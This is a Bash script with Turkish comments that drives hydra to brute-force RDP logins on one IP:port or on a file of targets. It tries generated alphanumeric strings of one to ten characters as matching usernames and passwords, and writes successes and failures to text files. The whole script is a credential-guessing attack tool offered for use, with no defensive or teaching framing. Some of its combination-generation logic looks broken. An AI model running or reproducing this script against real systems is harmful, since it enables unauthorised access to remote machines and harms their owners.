#!/bin/bash

# Çıktı dosyaları
success_file="başarılı.txt"
failure_file="başarısız.txt"

# Karakter kümesi: a-z ve 0-9
charset=( {a..z} {0..9} )

# Kullanıcı adı ve parolaları oluştur ve dene
function generate_and_test() {
    local target_ip=$1
    local target_port=$2
    local length=$3
    local combinations=$(eval echo "{$4}")
    
    for combination in $combinations; do
        echo "Testing username and password: $combination on $target_ip:$target_port"
        result=$(hydra -l $combination -p $combination -t 1 -f rdp://$target_ip:$target_port 2>&1)
        
        if [[ $result == *"login:"* ]]; then
            echo "Başarılı: $combination on $target_ip:$target_port" | tee -a $success_file
        else
            echo "Başarısız: $combination on $target_ip:$target_port" | tee -a $failure_file
        fi
    done
}

# Kombinasyonları dene
function test_combinations() {
    local target_ip=$1
    local target_port=$2
    
    # Tek haneli kombinasyonları dene
    generate_and_test $target_ip $target_port 1 '{a..z}{0..9}'

    # İki haneli kombinasyonları dene
    for c1 in {a..z}{0..9}; do
        generate_and_test $target_ip $target_port 2 "{$c1}{a..z}{0..9}"
    done

    # Üç haneli kombinasyonları dene
    for c1 in {a..z}{0..9}; do
        for c2 in {a..z}{0..9}; do
            generate_and_test $target_ip $target_port 3 "{$c1}{$c2}{a..z}{0..9}"
        done
    done

    # Dört ve daha fazla haneli kombinasyonlar için
    max_length=10
    for length in $(seq 4 $max_length); do
        chars='{a..z}{0..9}'
        for (( i=1; i<$length; i++ )); do
            chars="$chars{a..z}{0..9}"
        done
        generate_and_test $target_ip $target_port $length $chars
    done
}

# Argümanları kontrol et ve işle
if [[ $1 == i=* ]]; then
    ip_port=${1#i=}
    IFS=':' read -r target_ip target_port <<< "$ip_port"
    test_combinations $target_ip $target_port
elif [[ $1 == d=* ]]; then
    file=${1#d=}
    while IFS=: read -r target_ip target_port; do
        test_combinations $target_ip $target_port
    done < "$file"
else
    echo "Kullanım: $0 i=ip:port veya $0 d=ip.txt"
    exit 1
fi

